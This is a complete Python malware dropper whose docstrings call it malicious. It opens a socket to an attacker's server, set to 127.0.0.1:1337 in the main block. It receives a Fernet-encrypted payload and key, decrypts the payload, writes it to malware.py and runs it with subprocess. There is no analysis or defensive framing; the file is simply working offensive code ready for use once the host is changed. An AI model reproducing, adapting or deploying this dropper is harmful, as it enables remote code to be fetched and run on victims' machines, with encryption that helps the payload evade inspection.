#!/usr/bin/env python3

import base64
import socket
import subprocess

from cryptography.fernet import Fernet


class Dropper:
    def __init__(self, hostname, port):
        self.hostname = hostname
        self.port = port

    def fetch(self):
        """Fetch malicious code from attacker's server."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.connect((self.hostname, self.port))
            self.code = client.recv(1024)
            self.key = client.recv(1024)
        print("[+] Code successfully downloaded")

    def decrypt(self):
        """Decrypt both key and code before outputing to another file."""
        self.key = base64.b64decode(self.key)
        self.cryptor = Fernet(self.key)
        self.code = self.cryptor.decrypt(self.code)
        print("[+] Code successfully decrypted")

    def output(self):
        """Output malicious code to external file."""
        with open("malware.py", "wb") as output:
            output.write(self.code)
        print("[+] Code written to external file")

    def execute(self):
        """Run recently created malicious file."""
        subprocess.Popen(("python", "malware.py"))

    def main(self):
        self.fetch()
        self.decrypt()
        self.output()
        self.execute()


if __name__ == "__main__":
    dropper = Dropper("127.0.0.1", 1337)
    dropper.main()
